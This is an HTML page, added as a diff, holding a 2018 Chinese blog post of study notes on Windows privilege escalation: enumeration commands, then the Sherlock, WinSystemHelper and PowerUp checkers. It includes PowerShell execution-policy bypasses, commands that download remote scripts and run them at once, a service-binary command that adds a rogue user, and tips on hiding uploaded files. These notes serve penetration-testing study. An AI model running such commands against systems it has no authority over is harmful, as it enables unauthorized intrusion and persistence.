@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+
+
+<title>提权(一)-Windows系统 | langke Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+</head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bentham&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bentham&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div id="post-toc" class="post-toc">
+            <span class="post-toc-title">catalogue</span>
+            <div class="post-toc-content">
+                <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#前情提要"><span class="toc-text">前情提要</span></a></li></ol><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows基础提权命令"><span class="toc-text">Windows基础提权命令</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#查看系统信息"><span class="toc-text">查看系统信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#主机名"><span class="toc-text">主机名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#环境变量"><span class="toc-text">环境变量</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#查看用户信息"><span class="toc-text">查看用户信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#查看服务pid号"><span class="toc-text">查看服务pid号</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#查看系统名"><span class="toc-text">查看系统名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#查看补丁信息"><span class="toc-text">查看补丁信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#查看当前安装程序"><span class="toc-text">查看当前安装程序</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows提权分析工具使用"><span class="toc-text">windows提权分析工具使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-WinSystemHelper-master"><span class="toc-text">1. WinSystemHelper-master</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Sherlock"><span class="toc-text">2. Sherlock</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Privesc"><span class="toc-text">3. Privesc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#写在后面的话"><span class="toc-text"> 写在后面的话 </span></a></li></ol>
+            </li></ol></li></div>
+        </div>
+    
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">提权(一)-Windows系统</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">langke</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">September 24, 2018&nbsp;&nbsp;15:41:06</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <section class="post-content">
+            <h4 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h4><ul>
+<li>这篇文章主要是为了总结一下这几天的成果。</li>
+<li>在此梳理以及记录，方便日后查看，复习。  <a id="more"></a>
+<img src="https://bj.bcebos.com/v1/image-langke/img_hexo/Windows_zongjie.png" alt="总结"><h2 id="Windows基础提权命令"><a href="#Windows基础提权命令" class="headerlink" title="Windows基础提权命令"></a>Windows基础提权命令</h2></li>
+</ul>
+<blockquote>
+<h5 id="查看系统信息"><a href="#查看系统信息" class="headerlink" title="查看系统信息"></a>查看系统信息</h5><blockquote>
+<p><code>systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</code><br>比如：<code>systeminfo | findstr /C:&quot;OS 名称&quot;</code><br><img src="/img/systeminfo_.png" alt="演示"></p>
+</blockquote>
+</blockquote>
+<blockquote>
+<h5 id="主机名"><a href="#主机名" class="headerlink" title="主机名"></a>主机名</h5><blockquote>
+<p><code>Hostname</code></p>
+</blockquote>
+</blockquote>
+<blockquote>
+<h5 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h5><blockquote>
+<p><strong>Set</strong>    查看所有环境变量<br><strong>path</strong>   查看常用软件环境变量</p>
+</blockquote>
+</blockquote>
+<blockquote>
+<h5 id="查看用户信息"><a href="#查看用户信息" class="headerlink" title="查看用户信息"></a>查看用户信息</h5><blockquote>
+<p><code>Net user</code><br><code>Net1 user</code></p>
+</blockquote>
+</blockquote>
+<blockquote>
+<h5 id="查看服务pid号"><a href="#查看服务pid号" class="headerlink" title="查看服务pid号"></a>查看服务pid号</h5><blockquote>
+<p><code>Tasklist /svc | find &quot;TermService&quot;</code><br><code>netstat -ano | find &quot;1488&quot;</code></p>
+</blockquote>
+</blockquote>
+<blockquote>
+<h5 id="查看系统名"><a href="#查看系统名" class="headerlink" title="查看系统名"></a>查看系统名</h5><blockquote>
+<p><code>wmic os get caption</code></p>
+</blockquote>
+</blockquote>
+<blockquote>
+<h5 id="查看补丁信息"><a href="#查看补丁信息" class="headerlink" title="查看补丁信息"></a>查看补丁信息</h5><blockquote>
+<p><code>wmic qfe get Description,HotFixID,InstalledOn | findstr /C:&quot;KB4013389&quot; /C:&quot;KB958644&quot;</code></p>
+</blockquote>
+</blockquote>
+<blockquote>
+<h5 id="查看当前安装程序"><a href="#查看当前安装程序" class="headerlink" title="查看当前安装程序"></a>查看当前安装程序</h5><blockquote>
+<p><code>wmic product get name,version</code></p>
+</blockquote>
+</blockquote>
+<p>  这里只列出了提权过程中常用的部分语法，当然还有很多其它的语法，这里不一一列举。</p>
+<h2 id="windows提权分析工具使用"><a href="#windows提权分析工具使用" class="headerlink" title="windows提权分析工具使用"></a>windows提权分析工具使用</h2><p>  由于每个系统对应的EXP都会有很多，渗透测试的时候，不可能把每个EXP都试一遍，所以我们要用脚本来帮助我们发现存在的可利用漏洞，这里介绍三款分析工具。</p>
+<h3 id="1-WinSystemHelper-master"><a href="#1-WinSystemHelper-master" class="headerlink" title="1. WinSystemHelper-master"></a>1. WinSystemHelper-master</h3><p><strong> 直接从GitHub下载相应的软件<a href="https://github.com/brianwrf/WinSystemHelper/archive/master.zip" target="_blank" rel="noopener">WinSystemHelper</a>,也可以去看<a href="https://raw.githubusercontent.com/brianwrf/WinSystemHelper/master/README.md" target="_blank" rel="noopener">详细说明</a> </strong><br>上传.bat和.txt文件到目标服务器，运行bat查看结果。<br>下面是本机运行后的效果图。之后选一个有眼缘的漏洞来进一步测试。<br><img src="/img/WinSystemHelper_.png" alt="效果图"></p>
+<h3 id="2-Sherlock"><a href="#2-Sherlock" class="headerlink" title="2. Sherlock"></a>2. Sherlock</h3><p>  PowerShell脚本可快速查找缺少的本地权限提升漏洞的软件修补程序。<br>本地上传加载脚本</p>
+<blockquote>
+<p>首先调用powershell.exe<br><code>powershell.exe -exec bypass</code><br>加载脚本<br><code>Import-Module Sherlock.ps1</code><br>发现漏洞<br><code>Find-AllVulns</code></p>
+</blockquote>
+<p><img src="/img/Sherlock_.png" alt="演示图"></p>
+<p>远程加载脚本</p>
+<blockquote>
+<p><code>IEX(New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1&#39;)</code></p>
+</blockquote>
+<blockquote>
+<p><code>Find-AllVulns</code></p>
+</blockquote>
+<h3 id="3-Privesc"><a href="#3-Privesc" class="headerlink" title="3. Privesc"></a>3. Privesc</h3><p>  PowerSploit - PowerShell后利用框架中的一个<br>本地上传执行</p>
+<blockquote>
+<p>首先调用powershell.exe<br><code>powershell.exe -exec bypass</code><br>加载脚本<br><code>Import-Module Privesc.psm1</code><br>查看导入的命令<br><code>Get-Command -Module Privesc</code><br>输出漏洞情况<br>Invoke-AllChecks</p>
+</blockquote>
+<p><img src="/img/Privesc_.png" alt="全部命令" title="此模块的全部命令"><br><img src="/img/Privesc__.png" alt="漏洞情况" title="系统存在的漏洞情况"></p>
+<p>远程加载</p>
+<blockquote>
+<p><code>powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1&#39;); Invoke-AllChecks&quot;</code></p>
+</blockquote>
+<p><img src="/img/Privesc___.png" alt="一行命令"></p>
+<p>添加用户</p>
+<blockquote>
+<p><code>Install-ServiceBinary -ServiceName &#39;Apache_pn&#39; -UserName langke -Password 123456</code></p>
+</blockquote>
+<h4 id="写在后面的话"><a href="#写在后面的话" class="headerlink" title=" 写在后面的话 "></a><strong> 写在后面的话 </strong></h4><ul>
+<li>上传文件一般会首选垃圾文件夹<code>C:\Recovery</code>，其次是<code>C:\Users\All Users</code></li>
+<li>这里只讲了对Windows服务器可能存在漏洞的分析方法</li>
+<li>具体的漏洞利用方法这里就不讲了，因为太对了。无非都是相同的套路，创建用户-提升权限-ssh登陆</li>
+</ul>
+
+        </section>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>langke</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://yoursite.com/2018/09/24/提权-一-Windows系统/">http://yoursite.com/2018/09/24/提权-一-Windows系统/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="https://langkexiansheng">Langke</a></span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY<strong>?</strong></strong></span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/tiquan/"># tiquan</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2018/09/25/提权-二-Linux系统/">提权(二)-Linux系统</a>
+            
+            
+            <a class="next" rel="next" href="/2018/09/19/文件操作小脚本/">文件操作小脚本</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© langke | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
